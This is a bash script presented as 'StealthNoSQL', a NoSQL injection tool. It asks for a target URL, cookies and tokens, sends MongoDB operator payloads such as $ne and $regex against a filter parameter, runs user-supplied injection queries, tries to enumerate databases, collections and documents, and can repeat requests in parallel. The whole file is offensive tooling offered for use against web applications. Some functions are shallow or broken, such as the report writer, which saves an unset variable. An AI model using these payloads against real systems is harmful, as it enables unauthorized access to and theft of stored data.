#!/bin/bash


print_banner() {
    local banner=(
        "******************************************"
        "*              StealthNoSQL              *"
        "*    The Ultimate NoSQL Injection Tool   *"
        "*                  v1.3.0                *"
        "*      ----------------------------      *"
        "*                        by @ImKKingshuk *"
        "* Github- https://github.com/ImKKingshuk *"
        "******************************************"
    )
    local width=$(tput cols)
    for line in "${banner[@]}"; do
        printf "%*s\n" $(((${#line} + width) / 2)) "$line"
    done
    echo
}


make_request() {
    local url="$1"
    local headers=()
    if [ -n "$session_cookie" ]; then
        headers+=("-H" "Cookie: $session_cookie")
    fi
    if [ -n "$auth_token" ]; then
        headers+=("-H" "Authorization: Bearer $auth_token")
    fi
    if [ -n "$custom_headers" ]; then
        IFS=',' read -ra hdrs <<< "$custom_headers"
        for hdr in "${hdrs[@]}"; do
            headers+=("-H" "$hdr")
        done
    fi
    curl -s -k -A "$user_agent" --proxy "$proxy" "${headers[@]}" "$url"
}


encode_payload() {
    local payload="$1"
    echo -n "$payload" | jq -sRr @uri
}


detect_nosqli() {
    local url="$1"
    local payloads=(
        '{"$ne": null}' 
        '{"$gt": ""}' 
        '{"$regex": "^a"}' 
        '{"$eq": "a"}' 
        '{"$in": ["a", "b", "c"]}' 
        '{"$not": {"$type": 2}}' 
        '{"username": {"$regex": "^admin"}}' 
    )
    echo "Detecting NoSQL injection vulnerabilities..."
    for payload in "${payloads[@]}"; do
        full_url="$url?filter=$(encode_payload "$payload")"
        response=$(make_request "$full_url")
        if [[ "$response" =~ "error" || "$response" =~ "found" ]]; then
            echo "Potential NoSQL Injection found with payload: $payload"
            return 0
        fi
    done
    echo "No NoSQL Injection vulnerabilities detected."
    return 1
}


nosql_injection() {
    local url="$1"
    local query="$2"
    local encoded_payload

    echo "Injecting NoSQL payload..."
    encoded_payload=$(encode_payload "$query")
    full_url="$url?filter=$encoded_payload"
    response=$(make_request "$full_url")
    echo "Response: $response"
}


enumerate_nosql() {
    local url="$1"
    local target="$2"
    local enum_type="$3"
    local query

    case $enum_type in
        databases)
            query='{"listDatabases": 1}' 
            ;;
        collections)
            query='{"listCollections": 1}' 
            ;;
        documents)
            query='{}' 
            ;;
        *)
            echo "Invalid enumeration type."
            return 1
            ;;
    esac
    nosql_injection "$url" "$query"
}


parallel_execution() {
    local url="$1"
    local query="$2"
    local threads="$3"
    echo "Starting parallel execution with $threads threads..."
    for i in $(seq 1 "$threads"); do
        nosql_injection "$url" "$query" &
    done
    wait
    echo "Parallel execution completed."
}


real_time_monitoring() {
    local log_file="$1"
    tail -f "$log_file"
}


generate_report() {
    local format="$1"
    local report_file="nosql_report.$format"
    echo -e "$output" > "$report_file"
    echo "Report generated: $report_file"
}


main() {
    print_banner
    read -p "Enter the target URL (e.g., https://www.example.com): " url
    url="${url%/}"

    read -p "Enter the session cookie (if any, press Enter to skip): " session_cookie
    read -p "Enter the authentication token (if any, press Enter to skip): " auth_token
    read -p "Enter the proxy (if any, press Enter to skip): " proxy
    read -p "Enter custom headers (comma separated, if any, press Enter to skip): " custom_headers
    read -p "Enter the User-Agent (if any, press Enter to use default): " user_agent
    user_agent="${user_agent:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36}"

    detect_nosqli "$url"

    read -p "Would you like to perform an injection? (y/n): " inject_choice
    if [ "$inject_choice" == "y" ]; then
        read -p "Enter the injection query: " query_input
        nosql_injection "$url" "$query_input"
    fi

    read -p "Would you like to enumerate databases, collections, or documents? (databases/collections/documents/none): " enum_choice
    if [ "$enum_choice" != "none" ]; then
        read -p "Enter the target name for enumeration: " enum_target
        enumerate_nosql "$url" "$enum_target" "$enum_choice"
    fi

    read -p "Enable multi-threading? (y/n): " multi_thread_choice
    if [ "$multi_thread_choice" == "y" ]; then
        read -p "Enter the number of threads: " threads
        parallel_execution "$url" "$query_input" "$threads"
    fi

    read -p "Enable real-time monitoring? (y/n): " monitor_choice
    if [ "$monitor_choice" == "y" ]; then
        read -p "Enter the log file path: " log_file
        real_time_monitoring "$log_file"
    fi

    read -p "Generate report? (y/n): " generate_report_choice
    if [ "$generate_report_choice" == "y" ]; then
        read -p "Enter report format (html/json/csv): " report_format
        generate_report "$report_format"
    fi
}

main